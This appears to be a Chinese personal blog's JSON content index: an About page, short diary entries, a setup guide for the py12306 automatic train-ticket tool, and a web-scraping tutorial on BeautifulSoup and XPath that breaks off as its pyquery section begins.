{"pages":[{"title":"About","text":"关于本站既然这是本站的第一篇博文，首先得说下这个博客搭建的初衷： 好记性不如烂笔头，何况我根本没有好记性。记忆力这种东西就像内存，你渴望接受的东西越多需要记忆的量也就越大，所以会频繁性的造成遗忘之前所学所想的现象。当你某一天需要的时候，可能又会支付较大的时间成本才能再次捡起。所以希望能在本站记录一些自己的学习过程，以便日后的再次回顾。 记得在自己学习的时候，总会出现各种各样的玄学bug，而此时首先想到的就是去biadu、google、Stack Overflow等一些知名网站去寻找解决方法。然而令人崩溃的是这些解答大同小异，使用之后依然不能解决问题，原本一个小小的问题却需要花费大量的时间。所以希望来访的朋友都能够有所收获，在较短的时间内解决看起来不是问题的问题。 感觉拥有一个自己的个人博客很Cool，能够在这“为所欲为、畅所欲言”，而不像csdn、博客园那样的有所拘束。 可以说博主的语文那是相当差劲了，高考六七十分的选手（我也不知道为什么，考完之后明明感觉还行的），说多了都是泪啊 (ノへ￣、)。所以想在这个博客里锻炼一下自己的语言组织能力。 基于以上几点，所以就有了建站的想法。虽然之前花了将近20天使用Django、ssm后端框架 + 前端 + 各种插件来搭建过博客，但是为了避免备案、维护等困扰，所以最终选择了成熟的Hexo来实现。经过两天的坚持，最终本站才初见成色。 本站历程： 2018-09-05 使用Hexo+Next成功搭建个人博客系统，基本功能已经有了。 (￣_,￣ ) 2018-09-10 添加鼠标点击出现爱心效果，以及miku宠物 o(*≧▽≦)ツ┏━┓ 2018-09-27 成功引入DaoVoice网页在线联系功能，有问题欢迎亲友们在线联系博主。 2018-10-10 在本站左下角添加Aplayer音乐系统，提高了亲友们的阅读体验 (ˉ▽￣～) 切~~ 2018-10-13 添加了搜索功能，主要用于方便搜索站内文章；添加了日程表菜单，主要用于记录生活中的点滴。╰(°▽°)╯ 关于我Aaron Li是江西上饶的一位小伙子，现于上海就读，现实生活中比较内向、形单影只，但热衷于各种技术，学的东西也比较杂，目前正朝着极客的方向努力。至于未来发展的如何，一切都只是未知数，总而言之，言而总之，希望自己能够在这条道路上坚持下去。个人爱好： 动漫、code、音乐、乒乓球、棋牌、学习 本人擅长Ai、Fw、Fl、Br、 Ae、Pr、Id、Ps等软件的安装与卸载，精通 CSS、JavaScript、PHP、ASP、C、C＋＋、 C#、Java、Ruby、Perl、Lisp、python、 Objective-C、ActionScript、Pascal等单词拼 写，熟悉Windows、Linux、Mac、 Android、IOS、WP8等系统的开关机……求一份设计相关的工作本人擅长Ai、Fw、Ps等软件的安装与卸载的工作 Contcat me： Email：26647978@qq.com QQ：26647879 VX：LT510087153 右方的DaoVoice在线联系 文末的Gitalk留言 友链添加最后，欢迎各位大佬互加友链，可在下方留言，友链互加事项及方式如下： 事项： 贵站需要保持一定的活跃度 贵站必须有10篇以上原创文章 贵站不在更新请及时联系本站 方式： 贵站将本站添加至友链后，可在下方Gitalk留言，附上贵站的链接及贵站主要分享类别即可。 本站须知 本站所有内容建议务必在PC端进行阅读，手机端的阅读效果可能不佳，也许会影响到您的阅读体验，给您带来不便敬请谅解。 本站部分所总结的内容涉及到Kali渗透，具有一定的攻击行为，所以仅供博主记录之用，切勿用于非法操作，一切后果由使用者本人自负。 本站所记录的内容没有特别标注的皆为博主日常学习所总结，欢迎各位的转载，转载时注明链接与作者即可。 本站转载文章会在醒目处留有说明，如有侵权还请联系。 如果本站内容能给你带来帮助那最好不过了，如果不喜欢的话也不要那个啥的，谢谢。","path":"about/index.html"},{"title":"tags","text":"","path":"tags/index.html"},{"title":"简简单单","text":"2019-02-18今雨，收拾收拾准备返校迎接新的学期，必须加油啊！！！ 2019-02-14什么节奏，这段时间太冷了吧。w(ﾟДﾟ)w 2019-01-13没了味，这杯水有点调皮了。 2018-11-12这个零六年的动漫太好看了吧，这么多年居然把这个给忘了。 2018-10-26或许需要达到“江湖骗子”的等级，才能玩转社会工程学吧。","path":"schedule/index.html"},{"title":"categories","text":"","path":"categories/index.html"}],"posts":[{"title":"12306自动化抢票","text":"瞎扯不知不觉，这年也算是过完了。 于我而言，现在的春节似乎已经没有了幼时所应该感受到的乐趣。蓦然回首，往事历历在目，仍记得幼时的伙伴常常聚在一起玩卡牌、捡鞭炮、拜年….如今，这一切的一切都已成浮云，或许是因为我们感受到了生活、学习等带来的压力，在压力袭来的同时我们一步步的成长着，现在的我们必须学会某些事、承担某些事，所以幼时的无忧无虑现在是那么的奢侈。 前言春节之后，大多数亲戚朋友都需要为了生活而奔波而远离家乡，前段时间有亲戚因购买不到南昌-深圳的车票而焦灼着。众所周知，12306的防爬措施是做的很极致的，曾经自己也尝试着使用python来写一个12306的抢票程序，耐于目前自己的能力以及时间受限，在验证过程中始终通过不了，而自己又没有足够的经济条件来使用打码平台，所以就尝试去github上搜索下相关12306抢票项目。果不其然，在github上就有这么一款12306抢票神器，使用之后然我欲罢不能，经过四天的努力终于帮亲戚抢到了3张南昌-深圳的车票。 前人栽树，后人乘凉。基于该神器的强大，所以想通过该文章记录一下使用方式，也方便后来者的较快的了解该项目，项目github仓库：https://github.com/pjialin/py12306，在此，也感谢作者的用心良苦，希望这个工具能够帮助到大家。 正文该项目需要在python3.6以上版本才能使用，操作系统windowns、linux、mac（亲测有效）都可以，这里我们使用windows为例。 首先，我们需要前往github仓库下载下载该12306抢票项目（py12306），git的下载在这里就不再说明了，不清楚的可以跳至：Git安装，安装好后我们通过如下命令来进行下载： 1git clone https://github.com/pjialin/py12306 在安装好python3.6以上版本之后，我们还需要安装其他支持工具，这里python建议下载Anaconda，下载及安装操作见：Anaconda下载及安装，python安装好后，我们在终端执行如下命令来下载支持工具： 123pip install redis==3.0.1pip install Flask-JWT-Extended==3.15.0pip install requests-html==0.9.0 随后，我们复制/py12306/env.py.example文件并将复制后的文件命名为env.py。 打开浏览器使用目标12306账号登录12306官网并添加抢票乘客（可多个，注意将身份证等信息填写正确，学生需要额外填写相关信息）。 使用sublime编辑器（亦或其他）打开上述复制的env.py文件，并将12306账号、车次、时间等信息配置完成，主要配置说明如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485# 设置一：12306抢票账号USER_ACCOUNTS = [ &#123; 'key': 0, # 12306账号id1，用于区分不同抢票账号 'user_name': [username1], # 12306账号用户名1 'password': [password1], # 12306账号用户密码1 &#125;, # &#123; # 'key': 2, # 12306账号id2 # 'user_name': [username2], # 用户2 # 'password': [password2], # 密码2 # &#125;,]# 设置二： 打码平台，用于验证码识别# 打码平台账号# 目前只支持免费打码接口 和 若快打码，注册地址：http://www.ruokuai.com/loginAUTO_CODE_PLATFORM = 'free' # 免费填写 free 若快 ruokuai # 免费打码无法保证持续可用，如失效请手动切换AUTO_CODE_ACCOUNT = &#123; # 使用 free 可用省略 'user': 'your user name', 'pwd': 'your password'&#125;# 设置三：邮箱配置，用于抢票成功通知EMAIL_ENABLED = 1 # 是否开启邮件通知EMAIL_SENDER = 'XXX@qq.com' # 邮件发送者EMAIL_RECEIVER = ['XXX1@qq.com', 'XXX2@qq.com'] # 邮件接受者，可以多个 EMAIL_SERVER_HOST = 'smtp.qq.com' # 邮件服务 hostEMAIL_SERVER_USER = 'XXX@qq.com' # 邮件服务登录用户名，我在抢票的时候使用的是qq邮件服务，自行前往qq邮箱进行设置EMAIL_SERVER_PASSWORD = 'password' # 邮件服务登录密码，qq邮箱设置完成之后会有一个密码，于此处填写即可# 设置四： web管理（flask）WEB_ENABLE = 1 # 是否打开 Web 管理WEB_USER = &#123; # 登录信息 'username': 'admin', 'password': 'password'&#125;WEB_PORT = 8008 # 监听端口# 设置完成并程序运行之后，请求http://localhost:8008登录进行管理# 设置五：乘客信息设置QUERY_JOBS = [ &#123; # 'job_name': 'bj -&gt; sz', # 任务名称，不填默认会以车站名命名，不可重复 'account_key': 0, # 将会使用指定账号下单，于之前的12306账号id对应 'left_dates': [ # 出发日期 :Array，可多选，按照自己的行程排序 \"2019-02-16\", \"2019-02-17\", ], 'stations': &#123; # 车站 支持多个车站同时查询 :Dict or :List 'left': '亳州', # 始发地 'arrive': '北京西', # 目的地 &#125;, # # 多个车站示例 (建议添加多个，有时多买几站成功率会高一点) # 'stations': [&#123; # 'left': '北京', # 'arrive': '深圳', # &#125;,&#123; # 多个车站示例 # 'left': '北京', # 'arrive': '广州', # &#125;], 'members': [ \"张三\", # 乘客姓名，于之前12306账号添加的乘客一致，可自动识别乘客类别 ], 'allow_less_member': 0, # 是否允许余票不足时提交部分乘客 'seats': [ # 筛选座位，可多选，根据自己的倾向进行排序 # 可用值: 特等座, 商务座, 一等座, 二等座, 软卧, 硬卧, 动卧, 软座, 硬座, 无座 '硬卧', # '软卧', ], 'train_numbers': [ # 筛选车次 可以为空，为空则所有车次都可以提交 如 [] 注意大小写需要保持一致 \"K148\", # \"K1172\", ], 'except_train_numbers': [ # 筛选车次，排除车次 train_numbers 和 except_train_numbers 不可同时存在 ], 'period': &#123; # 筛选时间 'from': '00:00', 'to': '24:00' &#125; &#125;, # 如若有其他12306账号进行抢票，可在此列表中进行添加，添加内容同上] 于此，该项目的设置基本完成，之后我们运行main.py主程序即可，命令如下： 1cd ./py12306 $$ python main.py 运行结果示例如下： 结语以上内容仅为该项目的部分功能，如若像了解该项目更多信息，可前往项目地址:py12306 py12306交流群：274781597 最后，感谢作者的用心良苦，希望这个工具能够帮助到大家。","path":"2019/02/13/12306自动化抢票/"},{"title":"网页爬虫之页面解析","text":"前言With the rapid development of the Internet，越来越多的信息充斥着各大网络平台。正如《死亡笔记》中L·Lawliet这一角色所提到的大数定律，在众多繁杂的数据中必然存在着某种规律，偶然中必然包含着某种必然的发生。不管是我们提到的大数定律，还是最近火热的大数据亦或其他领域都离不开大量而又干净数据的支持，为此，网络爬虫能够满足我们的需求，即在互联网上按照我们的意愿来爬取我们任何想要得到的信息，以便我们分析出其中的必然规律，进而做出正确的决策。同样，在我们平时上网的过程中，无时无刻可见爬虫的影子，比如我们广为熟知的“度娘”就是其中一个大型而又名副其实的“蜘蛛王”（SPIDER KING）。而要想写出一个强大的爬虫程序，则离不开熟练的对各种网络页面的解析，这篇文章将给读者介绍如何在Python中使用各大解析工具。 内容扼要常用的解析方式主要有正则、Beautiful Soup、XPath、pyquery，本文主要是讲解后三种工具的使用，而对正则表达式的使用不做讲解，对正则有兴趣了解的读者可以跳转：正则表达式 Beautiful Soup的使用 XPath的使用 pyquery的使用 Beautiful Soup、XPath、pyquery解析腾讯招聘网案例 Beautiful SoupBeautiful Soup是Python爬虫中针对HTML、XML的其中一个解析工具，熟练的使用之可以很方便的提取页面中我们想要的数据。此外，在Beautiful Soup中，为我们提供了以下四种解析器： 标准库，soup = BeautifulSoup(content, &quot;html.parser&quot;) lxml解析器，soup = BeautifulSoup(content, &quot;lxml&quot;) xml解析器，soup = BeautifulSoup(content, &quot;xml&quot;) html5lib解析器，soup = BeautifulSoup(content, &quot;html5lib&quot;) 在以上四种解析库中，lxml解析具有解析速度快兼容错能力强的merits，所以本文主要使用的是lxml解析器，下面我们主要拿百度首页的html来具体讲解下Beautiful Soup的使用： 12345678from bs4 import BeautifulSoupimport requestsif __name__ == \"__main__\": response = requests.get(\"https://www.baidu.com\") encoding = response.apparent_encoding response.encoding = encoding print(BeautifulSoup(response.text, \"lxml\")) 代码解读： response = requests.get(&quot;https://www.baidu.com&quot;)，requests请求百度链接 encoding = response.apparent_encoding，获取页面编码格式 response.encoding = encoding，修改请求编码为页面对应的编码格式，以避免乱码 print(BeautifulSoup(response.text, &quot;lxml&quot;))，使用lxml解析器来对百度首页html进行解析并打印结果 打印后的结果如下所示： 1234&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt; &lt;head&gt;&lt;meta content=\"text/html;charset=utf-8\" http-equiv=\"content-type\"/&gt;&lt;meta content=\"IE=Edge\" http-equiv=\"X-UA-Compatible\"/&gt;&lt;meta content=\"always\" name=\"referrer\"/&gt;&lt;link href=\"https://ss1.bdstatic.com/5eN1bjq8AAUYm2zgoY3K/r/www/cache/bdorz/baidu.min.css\" rel=\"stylesheet\" type=\"text/css\"/&gt;&lt;title&gt;百度一下，你就知道&lt;/title&gt;&lt;/head&gt; &lt;body link=\"#0000cc\"&gt; &lt;div id=\"wrapper\"&gt; &lt;div id=\"head\"&gt; &lt;div class=\"head_wrapper\"&gt; &lt;div class=\"s_form\"&gt; &lt;div class=\"s_form_wrapper\"&gt; &lt;div id=\"lg\"&gt; &lt;img height=\"129\" hidefocus=\"true\" src=\"//www.baidu.com/img/bd_logo1.png\" width=\"270\"/&gt; &lt;/div&gt; &lt;form action=\"//www.baidu.com/s\" class=\"fm\" id=\"form\" name=\"f\"&gt; &lt;input name=\"bdorz_come\" type=\"hidden\" value=\"1\"/&gt; &lt;input name=\"ie\" type=\"hidden\" value=\"utf-8\"/&gt; &lt;input name=\"f\" type=\"hidden\" value=\"8\"/&gt; &lt;input name=\"rsv_bp\" type=\"hidden\" value=\"1\"/&gt; &lt;input name=\"rsv_idx\" type=\"hidden\" value=\"1\"/&gt; &lt;input name=\"tn\" type=\"hidden\" value=\"baidu\"/&gt;&lt;span class=\"bg s_ipt_wr\"&gt;&lt;input autocomplete=\"off\" autofocus=\"autofocus\" class=\"s_ipt\" id=\"kw\" maxlength=\"255\" name=\"wd\" value=\"\"/&gt;&lt;/span&gt;&lt;span class=\"bg s_btn_wr\"&gt;&lt;input autofocus=\"\" class=\"bg s_btn\" id=\"su\" type=\"submit\" value=\"百度一下\"/&gt;&lt;/span&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=\"u1\"&gt; &lt;a class=\"mnav\" href=\"http://news.baidu.com\" name=\"tj_trnews\"&gt;新闻&lt;/a&gt; &lt;a class=\"mnav\" href=\"https://www.hao123.com\" name=\"tj_trhao123\"&gt;hao123&lt;/a&gt; &lt;a class=\"mnav\" href=\"http://map.baidu.com\" name=\"tj_trmap\"&gt;地图&lt;/a&gt; &lt;a class=\"mnav\" href=\"http://v.baidu.com\" name=\"tj_trvideo\"&gt;视频&lt;/a&gt; &lt;a class=\"mnav\" href=\"http://tieba.baidu.com\" name=\"tj_trtieba\"&gt;贴吧&lt;/a&gt; &lt;noscript&gt; &lt;a class=\"lb\" href=\"http://www.baidu.com/bdorz/login.gif?login&amp;amp;tpl=mn&amp;amp;u=http%3A%2F%2Fwww.baidu.com%2f%3fbdorz_come%3d1\" name=\"tj_login\"&gt;登录&lt;/a&gt; &lt;/noscript&gt; &lt;script&gt;document.write('&lt;a href=\"http://www.baidu.com/bdorz/login.gif?login&amp;tpl=mn&amp;u='+ encodeURIComponent(window.location.href+ (window.location.search === \"\" ? \"?\" : \"&amp;\")+ \"bdorz_come=1\")+ '\" name=\"tj_login\" class=\"lb\"&gt;登录&lt;/a&gt;'); &lt;/script&gt; &lt;a class=\"bri\" href=\"//www.baidu.com/more/\" name=\"tj_briicon\" style=\"display: block;\"&gt;更多产品&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=\"ftCon\"&gt; &lt;div id=\"ftConw\"&gt; &lt;p id=\"lh\"&gt; &lt;a href=\"http://home.baidu.com\"&gt;关于百度&lt;/a&gt; &lt;a href=\"http://ir.baidu.com\"&gt;About Baidu&lt;/a&gt; &lt;/p&gt; &lt;p id=\"cp\"&gt;©2017 Baidu &lt;a href=\"http://www.baidu.com/duty/\"&gt;使用百度前必读&lt;/a&gt; &lt;a class=\"cp-feedback\" href=\"http://jianyi.baidu.com/\"&gt;意见反馈&lt;/a&gt; 京ICP证030173号 &lt;img src=\"//www.baidu.com/img/gs.gif\"/&gt; &lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 从上述代码中，我们可以看见打印出的内容有点过于杂乱无章，为了使得解析后的页面清洗直观，我们可以使用prettify()方法来对其进行标准的缩进操作，为了方便讲解，博主对结果进行适当的删除，只留下有价值的内容，源码及输出如下： 12bd_soup = BeautifulSoup(response.text, \"lxml\")print(bd_soup.prettify()) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;html&gt; &lt;head&gt; &lt;title&gt; 百度一下，你就知道 &lt;/title&gt; &lt;/head&gt; &lt;body link=\"#0000cc\"&gt; &lt;div id=\"wrapper\"&gt; &lt;div id=\"head\"&gt; &lt;div class=\"head_wrapper\"&gt; &lt;div class=\"s_form\"&gt; &lt;div class=\"s_form_wrapper\"&gt; &lt;div id=\"lg\"&gt; &lt;img height=\"129\" hidefocus=\"true\" src=\"//www.baidu.com/img/bd_logo1.png\" width=\"270\"/&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=\"u1\"&gt; &lt;a class=\"mnav\" href=\"http://news.baidu.com\" name=\"tj_trnews\"&gt; 新闻 &lt;/a&gt; &lt;a class=\"mnav\" href=\"https://www.hao123.com\" name=\"tj_trhao123\"&gt; hao123 &lt;/a&gt; &lt;a class=\"mnav\" href=\"http://map.baidu.com\" name=\"tj_trmap\"&gt; 地图 &lt;/a&gt; &lt;a class=\"mnav\" href=\"http://v.baidu.com\" name=\"tj_trvideo\"&gt; 视频 &lt;/a&gt; &lt;a class=\"mnav\" href=\"http://tieba.baidu.com\" name=\"tj_trtieba\"&gt; 贴吧 &lt;/a&gt; &lt;a class=\"bri\" href=\"//www.baidu.com/more/\" name=\"tj_briicon\" style=\"display: block;\"&gt; 更多产品 &lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=\"ftCon\"&gt; &lt;div id=\"ftConw\"&gt; &lt;p id=\"lh\"&gt; &lt;a href=\"http://home.baidu.com\"&gt; 关于百度 &lt;/a&gt; &lt;a href=\"http://ir.baidu.com\"&gt; About Baidu &lt;/a&gt; &lt;/p&gt; &lt;p id=\"cp\"&gt; ©2017 Baidu &lt;a href=\"http://www.baidu.com/duty/\"&gt; 使用百度前必读 &lt;/a&gt; &lt;a class=\"cp-feedback\" href=\"http://jianyi.baidu.com/\"&gt; 意见反馈 &lt;/a&gt; 京ICP证030173号 &lt;img src=\"//www.baidu.com/img/gs.gif\"/&gt; &lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 节点选择在Beautiful Soup中，我们可以很方便的选择想要得到的节点，只需要在bd_soup对象中使用.的方式即可，使用如下： 12345678bd_title_bj = bd_soup.titlebd_title_bj_name = bd_soup.title.namebd_title_name = bd_soup.title.stringbd_title_parent_bj_name = bd_soup.title.parent.namebd_image_bj = bd_soup.imgbd_image_bj_dic = bd_soup.img.attrsbd_image_all = bd_soup.find_all(\"img\")bd_image_idlg = bd_soup.find(\"div\", id=\"lg\") 代码解读： bd_soup.title，正如前面所说，Beautiful Soup可以很简单的解析对应的页面，只需要使用bd_soup.的方式进行选择节点即可，该行代码正是获得百度首页html的title节点内容 bd_soup.title.name，使用.name的形式即可获取节点的名称 bd_soup.title.string，使用.string的形式即可获得节点当中的内容，这句代码就是获取百度首页的title节点的内容，即浏览器导航条中所显示的百度一下，你就知道 bd_soup.title.parent.name，使用.parent可以该节点的父节点，通俗地讲就是该节点所对应的上一层节点，然后使用.name获取父节点名称 bd_soup.img，如bd_soup.title一样，该代码获取的是img节点，只不过需要注意的是：在上面html中我们可以看见总共有两个img节点，而如果使用.img的话默认是获取html中的第一个img节点，而不是所有 bd_soup.img.attrs，获取img节点中所有的属性及属性内容，该代码输出的结果是一个键值对的字典格式，所以之后我们只需要通过字典的操作来获取属性所对应的内容即可。比如bd_soup.img.attrs.get(&quot;src&quot;)和bd_soup.img.attrs[&quot;src&quot;]的方式来获取img节点所对应的src属性的内容，即图片链接 bd_soup.find_all(&quot;img&quot;)，在上述中的.img操作默认只能获取第一个img节点，而要想获取html中所有的img节点，我们需要使用.find_all(&quot;img&quot;)方法，所返回的是一个列表格式，列表内容为所有的选择的节点 bd_soup.find(&quot;div&quot;, id=&quot;lg&quot;)，在实际运用中，我们往往会选择指定的节点，这个时候我们可以使用.find()方法，里面可传入所需查找节点的属性，这里需要注意的是：在传入class属性的时候其中的写法是.find(&quot;div&quot;, class_=&quot;XXX&quot;)的方式。所以该行代码表示的是获取id属性为lg的div节点，此外，在上面的.find_all()同样可以使用该方法来获取指定属性所对应的所有节点 上述代码中解析的结果对应打印如下： 12345678&lt;title&gt;百度一下，你就知道&lt;/title&gt;title百度一下，你就知道head&lt;img height=\"129\" hidefocus=\"true\" src=\"//www.baidu.com/img/bd_logo1.png\" width=\"270\"/&gt;&#123;'hidefocus': 'true', 'src': '//www.baidu.com/img/bd_logo1.png', 'width': '270', 'height': '129'&#125;[&lt;img height=\"129\" hidefocus=\"true\" src=\"//www.baidu.com/img/bd_logo1.png\" width=\"270\"/&gt;, &lt;img src=\"//www.baidu.com/img/gs.gif\"/&gt;]&lt;div id=\"lg\"&gt; &lt;img height=\"129\" hidefocus=\"true\" src=\"//www.baidu.com/img/bd_logo1.png\" width=\"270\"/&gt; &lt;/div&gt; 数据提取在上一小节节点选择我们讲到了部分数据提取的方法，然而，Beautiful Soup的强大之处还不止步于此。接下来我们继续揭开其神秘的面纱。 .get_text()获取对象中所有的内容： 1all_content = bd_soup.get_text() 123百度一下，你就知道 新闻 hao123 地图 视频 贴吧 登录 document.write('&lt;a href=\"http://www.baidu.com/bdorz/login.gif?login&amp;tpl=mn&amp;u='+ encodeURIComponent(window.location.href+ (window.location.search === \"\" ? \"?\" : \"&amp;\")+ \"bdorz_come=1\")+ '\" name=\"tj_login\" class=\"lb\"&gt;登录&lt;/a&gt;'); 更多产品 关于百度 About Baidu ©2017 Baidu 使用百度前必读 意见反馈 京ICP证030173号 .strings，.stripped_strings12print(type(bd_soup.strings))# &lt;class 'generator'&gt; .strings用于提取bd_soup对象中所有的内容，而从上面的输出结果我们可以看出.strings的类型是一个生成器，对此可以使用循环来提取出其中的内容。但是我们在使用.strings的过程中会发现提取出来的内容有很多的空格以及换行，对此我们可以使用.stripped_strings方法来解决该问题，用法如下： 12for each in bd_soup.stripped_strings: print(each) 输出结果： 1234567891011121314百度一下，你就知道新闻hao123地图视频贴吧登录更多产品关于百度About Baidu©2017 Baidu使用百度前必读意见反馈京ICP证030173号 .parent，.children，.parents.parent可以选择该节点的父节点，.children可以选择该节点的孩子节点，.parents选择该节点所有的上层节店，返回的是生成器，各用法如下： 12345678bd_div_bj = bd_soup.find(\"div\", id=\"u1\")print(type(bd_div_bj.parent))print(\"*\" * 50)for child in bd_div_bj.children: print(child)print(\"*\" * 50)for parent in bd_div_bj.parents: print(parent.name) 结果输出： 12345678910111213141516171819&lt;class 'bs4.element.Tag'&gt;************************************************** &lt;a class=\"mnav\" href=\"http://news.baidu.com\" name=\"tj_trnews\"&gt;新闻&lt;/a&gt; &lt;a class=\"mnav\" href=\"https://www.hao123.com\" name=\"tj_trhao123\"&gt;hao123&lt;/a&gt; &lt;a class=\"mnav\" href=\"http://map.baidu.com\" name=\"tj_trmap\"&gt;地图&lt;/a&gt; &lt;a class=\"mnav\" href=\"http://v.baidu.com\" name=\"tj_trvideo\"&gt;视频&lt;/a&gt; &lt;a class=\"mnav\" href=\"http://tieba.baidu.com\" name=\"tj_trtieba\"&gt;贴吧&lt;/a&gt;**************************************************divdivdivbodyhtml Beautiful Soup小结Beautiful Soup主要的用法就是以上一些，还有其他一些操作在实际开发过程中使用的不多，这里不做过多的讲解了，所以整体来讲Beautiful Soup的使用还是比较简单的，其他一些操作可见官方文档：https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html#contents-children XPathXPath全称是XML Path Language，它既可以用来解析XML，也可以用来解析HTML。在上一部分已经讲解了Beautiful Soup的一些常见的骚操作，在这里，我们继续来看看XPath的使用，瞧一瞧XPath的功能到底有多么的强大以致于受到了不少开发者的青睐。同Beautiful Soup一样，在XPath中提供了非常简洁的节点选择的方法，Beautiful Soup主要是通过.的方式来进行子节点或者子孙节点的选择，而在XPath中则主要通过/的方式来选择节点。除此之外，在XPath中还提供了大量的内置函数来处理各个数据之间的匹配关系。 首先，我们先来看看XPath常见的节点匹配规则： 表达式 解释说明 / 在当前节点中选取直接子节点 // 在当前节点中选取子孙节点 . 选取当前节点 .. 选取当前节点的父节点 @ 指定属性（id、class……） 下面我们继续拿上面的百度首页的HTML来讲解下XPath的使用。 节点选择要想正常使用Xpath，我们首先需要正确导入对应的模块，在此我们一般使用的是lxml，操作示例如下： 123456789101112from lxml import etreeimport requestsimport htmlif __name__ == \"__main__\": response = requests.get(\"https://www.baidu.com\") encoding = response.apparent_encoding response.encoding = encoding print(response.text) bd_bj = etree.HTML(response.text) bd_html = etree.tostring(bd_bj).decode(\"utf-8\") print(html.unescape(bd_html)) 1~9行代码如Beautiful Soup一致，下面对之后的代码进行解释： etree.HTML(response.text)，使用etree模块中的HTML类来对百度html(response.text)进行初始化以构造XPath解析对象，返回的类型为&lt;Element html at 0x1aba86b1c08&gt; etree.tostring(bd_html_elem).decode(&quot;utf-8&quot;)，将上述的对象转化为字符串类型且编码为utf-8 html.unescape(bd_html)，使用HTML5标准定义的规则将bd_html转换成对应的unicode字符。 打印出的结果如Beautiful Soup使用时一致，这里就不再显示了，不知道的读者可回翻。既然我们已经得到了Xpath可解析的对象(bd_bj)，下面我们就需要针对这个对象来选择节点了，在上面我们也已经提到了，XPath主要是通过/的方式来提取节点，请看下面Xpath中节点选择的一些常见操作： 12345all_bj = bd_bj.xpath(\"//*\") # 选取所有节点img_bj = bd_bj.xpath(\"//img\") # 选取指定名称的节点p_a_zj_bj = bd_bj.xpath(\"//p/a\") # 选取直接节点p_a_all_bj = bd_bj.xpath(\"//p//a\") # 选取所有节点head_bj = bd_bj.xpath(\"//title/..\") # 选取父节点 结果如下：123456789[&lt;Element html at 0x14d6a6d1c88&gt;, &lt;Element head at 0x14d6a6e4408&gt;, &lt;Element meta at 0x14d6a6e4448&gt;, &lt;Element meta at 0x14d6a6e4488&gt;, &lt;Element meta at 0x14d6a6e44c8&gt;, &lt;Element link at 0x14d6a6e4548&gt;, &lt;Element title at 0x14d6a6e4588&gt;, &lt;Element body at 0x14d6a6e45c8&gt;, &lt;Element div at 0x14d6a6e4608&gt;, &lt;Element div at 0x14d6a6e4508&gt;, &lt;Element div at 0x14d6a6e4648&gt;, &lt;Element div at 0x14d6a6e4688&gt;, ......][&lt;Element img at 0x14d6a6e4748&gt;, &lt;Element img at 0x14d6a6e4ec8&gt;][&lt;Element a at 0x14d6a6e4d88&gt;, &lt;Element a at 0x14d6a6e4dc8&gt;, &lt;Element a at 0x14d6a6e4e48&gt;, &lt;Element a at 0x14d6a6e4e88&gt;][&lt;Element a at 0x14d6a6e4d88&gt;, &lt;Element a at 0x14d6a6e4dc8&gt;, &lt;Element a at 0x14d6a6e4e48&gt;, &lt;Element a at 0x14d6a6e4e88&gt;][&lt;Element head at 0x14d6a6e4408&gt;] all_bj = bd_bj.xpath(&quot;//*&quot;)，使用//可以选择当前节点(html)下的所有子孙节点，且以一个列表的形式来返回，列表元素通过bd_bj一样是element对象，下面的返回类型一致 img_bj = bd_bj.xpath(&quot;//img&quot;)，选取当前节点下指定名称的节点，这里建议与Beautiful Soup的使用相比较可增强记忆，Beautiful Soup是通过.find_all(&quot;img&quot;)的形式 p_a_zj_bj = bd_bj.xpath(&quot;//p/a&quot;)，选取当前节点下的所有p节点下的直接子a节点，这里需要注意的是”直接“，如果a不是p节点的直接子节点则选取失败 p_a_all_bj = bd_bj.xpath(&quot;//p//a&quot;) ，选取当前节点下的所有p节点下的所有子孙a节点，这里需要注意的是”所有“，注意与上一个操作进行区分 head_bj = bd_bj.xpath(&quot;//title/..&quot;)，选取当前节点下的title节点的父节点，即head节点 数据提取在了解如何选择指定的节点之后，我们就需要提取节点中所包含的数据了，具体提取请看下面的示例： 1234img_href_ls = bd_bj.xpath(\"//img/@src\")img_href = bd_bj.xpath(\"//div[@id='lg']/img[@hidefocus='true']/@src\")a_content_ls = bd_bj.xpath(\"//a//text()\")a_news_content = bd_bj.xpath(\"//a[@class='mnav' and @name='tj_trnews']/text()\") 输出结果： 1234567['//www.baidu.com/img/bd_logo1.png', '//www.baidu.com/img/gs.gif']['//www.baidu.com/img/bd_logo1.png']['新闻', 'hao123', '地图', '视频', '贴吧', '登录', '更多产品', '关于百度', 'About Baidu', '使用百度前必读', '意见反馈']['新闻'] img_href_ls = bd_bj.xpath(&quot;//img/@src&quot;)，该代码先选取了当前节点下的所有img节点，然后将所有img节点的src属性值选取出来，返回的是一个列表形式 img_href = bd_bj.xpath(&quot;//div[@id=&#39;lg&#39;]/img[@hidefocus=&#39;true&#39;]/@src&quot;)，该代码首先选取了当前节点下所有id属性值为lg的div，然后继续选取div节点下的直接子img节点（hidefoucus=true），最后选取其中的src属性值 a_content_ls = bd_bj.xpath(&quot;//a//text()&quot;)，选取当前节点所有的a节点的所遇文本内容 a_news_content = bd_bj.xpath(&quot;//a[@class=&#39;mnav&#39; and @name=&#39;tj_trnews&#39;]/text()&quot;)，多属性选择，在xpath中可以指定满足多个属性的节点，只需要and即可 提醒：读者在阅读的过程中注意将代码和输出的结果仔细对应起来，只要理解其中的意思也就不难记忆了。 XPath小结耐心看完了XPath的使用方法之后，聪明的读者应该不难发现，其实Beautiful Soup和XPath的本质和思路上基本相同，只要我们在阅读XPath用法的同时在脑袋中不断的思考，相信聪明的你阅读至此已经能够基本掌握了XPath用法。 pyquery对于pyquery，官方的解释如下： pyquery allows you to make jquery queries on xml documents. The API is as much as possible the similar to jquery. pyquery uses lxml for fast xml and html manipulation.This is not (or at least not yet) a library to produce or interact with javascript code. I just liked the jquery API and I missed it in python so I told myself “Hey let’s make jquery in python”. This is the result.It can be used for many purposes, one idea that I might try in the future is to use it for templating with pure http templates that you modify 